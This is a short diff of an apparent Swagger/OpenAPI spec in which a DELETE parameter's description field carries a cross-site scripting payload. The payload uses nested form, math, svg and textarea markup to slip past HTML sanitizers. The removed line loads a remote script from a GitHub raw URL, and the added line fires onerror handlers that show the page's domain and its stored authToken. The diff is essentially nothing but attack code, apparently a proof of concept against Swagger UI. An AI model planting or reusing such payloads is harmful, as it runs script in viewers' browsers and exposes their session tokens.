@@ -26,7 +26,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://raw.githubusercontent.com/seeu-inspace/easyg/main/XSS%20all%20the%20things/swagger-script.js>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain) /><img onerror=javascript:alert(`Origin: ${window.origin} authToken:"${localStorage.getItem("authToken")}"`); src=1>"></form>
 
           format: int64
           in: path
